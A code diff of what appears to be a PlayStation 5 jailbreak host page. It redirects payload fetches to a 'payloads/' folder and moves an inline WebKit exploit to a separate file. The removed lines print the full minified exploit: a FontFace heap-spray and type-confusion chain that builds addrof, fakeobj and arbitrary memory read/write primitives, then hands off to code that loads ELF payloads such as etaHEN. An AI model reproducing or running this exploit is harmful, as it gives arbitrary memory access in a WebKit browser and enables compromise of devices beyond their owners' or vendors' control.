@@ -2059,7 +2059,7 @@ async function userland() {
         let total_sz = 0;
 
         await log("Loading ELF file: " + filename + " ...")
-        const response = await fetch('' + filename);
+        const response = await fetch('payloads/' + filename);
         if (!response.ok) {
             throw new Error(`Failed to fetch the binary file. Status: ${response.status}`);
         }
@@ -2308,7 +2308,7 @@ async function userland() {
 
 
     async function tcp_write(payload_to_send, sock_fd, uses_libhijacker_elf_loader = false) {
-        const response = await fetch('' + payload_to_send);
+        const response = await fetch('payloads/' + payload_to_send);
         if (!response.ok) {
             throw new Error(`Failed to fetch the binary file. Status: ${response.status}`);
         }
@@ -2687,11 +2687,10 @@ async function run_hax() {
 let fwScript = document.createElement('script');
 document.body.appendChild(fwScript);
 fwScript.onload = function () {
-// Conteúdo do webkit.js
-let webkitCode = `var PAGE_SIZE=16384,SIZEOF_CSS_FONT_FACE=184,HASHMAP_BUCKET=208,STRING_OFFSET=20,SPRAY_FONTS=4106,GUESS_FONT=8594325504,NPAGES=20,INVALID_POINTER=0,HAMMER_FONT_NAME="font8",HAMMER_NSTRINGS=700;function hex(r){return"number"!=typeof r?""+r:"0x"+new Number(r).toString(16)}function poc(){for(var r=new ArrayBuffer(8),e=new Uint8Array(r),n=new Uint32Array(r),t=new Float64Array(r),a=[],o=0;o<SPRAY_FONTS;o++)a.push(new FontFace("font1","",{}));var f=new FontFace("font2","url(data:text/html,)",{});a.push(f);for(var i=[],o=0;o<512;o++)i.push(new Array(31));i[256][0]=1.5,i[257][0]={},i[258][0]=1.5;var _={a:i[256],b:new Uint32Array(1),c:!0},u={},A=1e7;function S(r){for(var e="",n=0;n<8;n++)e+=String.fromCharCode(r%256),r=(r-r%256)/256;return e}function l(r,e){void 0===e&&(e=0);for(var n=0,t=7;0<=t;t--)n=256*n+r.charCodeAt(e+t);return n}var w=[];function s(r,e){e=e+"\0".repeat(r-STRING_OFFSET-8-e.length)+A++;return u[e]=1,w.push(e),e}var c=GUESS_FONT,E=!0,h=0,F=0;window.ffses={};do{for(var d=S(NPAGES+2),o=0;o<NPAGES;o++)d+=S(c+o*PAGE_SIZE);d+=S(INVALID_POINTER);for(o=0;o<256;o++)s(HASHMAP_BUCKET,d);ffses["search_"+ ++F]=new FontFaceSet(a);for(var v=s(HASHMAP_BUCKET,d),C=null,p=null,o=0;o<SPRAY_FONTS;o++)if(a[o].family="search"+F,v.substr(0,d.length)!=d){C=o;for(var N=v.substr(0,d.length),o=1;o<=NPAGES;o++)if(N.substr(8*o,8)!=d.substr(8*o,8)){p=l(d.substr(8*o,8));break}0==h++&&(c=p+2*PAGE_SIZE,p=null);break}}while((E=!E)&&(c+=NPAGES*PAGE_SIZE),null===p);d="";d+=S(26),d+=S(p),d+=S(p+SIZEOF_CSS_FONT_FACE);for(o=0;o<19;o++)d+=S(INVALID_POINTER);for(o=0;o<256;o++)s(HASHMAP_BUCKET,d);for(var T=[],o=0;;o++){ffses["ffs_leak_"+o]=new FontFaceSet([a[C],a[C+1],f]);var P=s(HASHMAP_BUCKET,d);T.push(s(HASHMAP_BUCKET,d)),a[C].family="evil2",a[C+1].family="evil3";var H=l(P.substr(P.length-8));if(H<281474976710656)break}function I(r,e){var n="";n+="0000",n+="ÿ\0\0\0ÿÿÿÿ",n+=S(r),n+=S(2147483668),d="",d+=S(29),d+=S(p),d+=S(p+SIZEOF_CSS_FONT_FACE),d+=S(p+2*SIZEOF_CSS_FONT_FACE);for(var t=0;t<18;t++)d+=S(INVALID_POINTER);for(t=0;t<256;t++)s(HASHMAP_BUCKET,d);ffses[e]=new FontFaceSet([a[C],a[C+1],a[C+2],f]);s(HASHMAP_BUCKET,d);n=s(HASHMAP_BUCKET,n);return a[C].family=e+"_evil1",a[C+1].family=e+"_evil2",a[C+2].family=e+"_evil3",T.push(n),n.length<1e3?I(r,e+"_"):n}for(var O=I(H,"ffs3"),o=0;o<1e5;o++)s(128,"");for(var m=[],o=0;o<65536;o++)m.push({value:1094927426}),m.push({value:_});for(var b=null;null===b;){Object.defineProperties({},m);for(o=0;;o++)if(66==O.charCodeAt(o)&&68==O.charCodeAt(o+1)&&67==O.charCodeAt(o+2)&&65==O.charCodeAt(o+3)&&0==O.charCodeAt(o+4)&&0==O.charCodeAt(o+5)&&254==O.charCodeAt(o+6)&&255==O.charCodeAt(o+7)&&14==O.charCodeAt(o+24)){b=l(O,o+32);break}}for(var M=I(b,"ffs4"),U=l(M,16),y=l(M,24),R=l(I(U,"ffs5"),8),G=I(y,"ffs6"),o=0;o<8;o++)e[o]=G.charCodeAt(o);r=n[0],M=n[1];n[0]=65536,n[1]=0,i[257][1]={},i[257][0]=t[0],n[0]=p+12*SIZEOF_CSS_FONT_FACE|0,n[1]=(p-p%4294967296)/4294967296,i[256][o]=t[0],pp_s="",pp_s+=S(56);for(o=0;o<12;o++)pp_s+=S(p+o*SIZEOF_CSS_FONT_FACE);U="";U+="0000",U+=S(INVALID_POINTER),U+=S(R),U+='\0\0\0\0"\0\0\0';for(var B=[],o=0;o<12;o++)B.push(a[C+o]);B.push(f);for(var K=[a[C+12]],o=0;o<5;o++)K.push(new FontFace(HAMMER_FONT_NAME,"url(data:text/html,)",{}));for(o=0;o<HAMMER_NSTRINGS;o++)s(HASHMAP_BUCKET,pp_s);ffses.ffs7=new FontFaceSet(B),s(HASHMAP_BUCKET,pp_s),ffses.ffs8=new FontFaceSet(K);var g=s(HASHMAP_BUCKET,U);T.push(g);for(o=0;o<13;o++)a[C+o].family="hammer"+o;function Z(r){return i[257][32]=r,t[0]=i[258][0],4294967296*n[1]+n[0]}var j=new Uint32Array(8),k=new Uint8Array(1),x=new Uint32Array(8),D={obj:null},y=Z(k),U=Z(D);n[0]=r,n[1]=M,e[6]=7;var L,M={jscell:t[0],butterfly:!0,buffer:j,size:22136};function V(r,e){e[4]=0|r,e[5]=r/4294967296|0}function Y(r,e){V(r,j),j[6]=e}window.addrof=function(r){return D.obj=r,(r=x)[4]+4294967296*r[5]},window.fakeobj=function(r){return V(r,x),D.obj},window.read_mem=function(r,e){Y(r,e);for(var n=[],t=0;t<e;t++)n.push(k[t]);return n},window.write_mem=function(r,e){Y(r,e.length);for(var n=0;n<e.length;n++)k[n]=e[n]},window.read_ptr_at=function(r){for(var e=0,n=read_mem(r,8),t=7;0<=t;t--)e=256*e+n[t];return e},window.write_ptr_at=function(r,e){for(var n=[],t=0;t<8;t++)n.push(255&e),e/=256;write_mem(r,n)},L=Z(M)+16,n[0]=L,n[1]=(L-L%4294967296)/4294967296,i[258][0]=t[0],(L=i[257][32])[4]=y,L[5]=(y-y%4294967296)/4294967296,M.buffer=x,L[4]=U,L[5]=(U-U%4294967296)/4294967296,L=null,function(){var r=read_ptr_at(addrof(g)+8)-208;write_mem(r,read_mem(r-96,208));for(var e=0;e<T.length;e++){var n=read_ptr_at(addrof(T[e])+8);write_ptr_at(n,4294967296*(HASHMAP_BUCKET-20)+1),write_ptr_at(n+8,n+20),write_ptr_at(n+16,2147483668)}write_ptr_at(R+248,133143986207)}();let z=new Uint32Array(8),q=new Uint32Array(2);U=addrof(q);let J=fakeobj(addrof(M)+16);M.buffer=q,J[7]=1,M.buffer=z,J[4]=U,J[5]=(U-U%4294967296)/4294967296,J[7]=1;U={write8:function(r,e){z[4]=r.low,z[5]=r.hi,e instanceof int64?(q[0]=e.low,q[1]=e.hi):(q[0]=e,q[1]=0)},write4:function(r,e){z[4]=r.low,z[5]=r.hi,e instanceof int64?q[0]=e.low:q[0]=e},write2:function(r,e){z[4]=r.low,z[5]=r.hi;r=4294901760&q[0];e instanceof int64?q[0]=65535&e.low|r:q[0]=65535&e|r},write1:function(r,e){z[4]=r.low,z[5]=r.hi;r=4294967040&q[0];e instanceof int64?q[0]=255&e.low|r:q[0]=255&e|r},read8:function(r){return z[4]=r.low,z[5]=r.hi,new int64(q[0],q[1])},read4:function(r){return z[4]=r.low,z[5]=r.hi,q[0]},read2:function(r){return z[4]=r.low,z[5]=r.hi,65535&q[0]},read1:function(r){return z[4]=r.low,z[5]=r.hi,255&q[0]},leakval:function(r){return D.obj=r,new int64(x[4],x[5])}};window.p=U,run_hax()}`;
-let webkitScript = document.createElement('script');
-webkitScript.textContent = webkitCode;
-document.body.appendChild(webkitScript);};
+    let webkitScript = document.createElement('script');
+    webkitScript.setAttribute('src', `webkit.js`);
+    document.body.appendChild(webkitScript);
+};
 fwScript.setAttribute('src', `offsets/${fw_str}.js`);
 	</script>
     
@@ -2706,7 +2705,8 @@ const payload_map =
             source: 'https://github.com/LightningMods/etaHEN',
             version: '1.1 beta'
         },
-    ];	
+    ];
+	
 	</script>
     
 	<script defer> //  src="custom_host_stuff.js"
@@ -2795,8 +2795,7 @@ function showToast(message) {
 }
 	</script>
     
-<!--
-	<script defer> // src="appcache_handler.js"
+	<!--script defer> // src="appcache_handler.js"
 	function get_appcache_state() {
     var appCache = window.applicationCache;
 
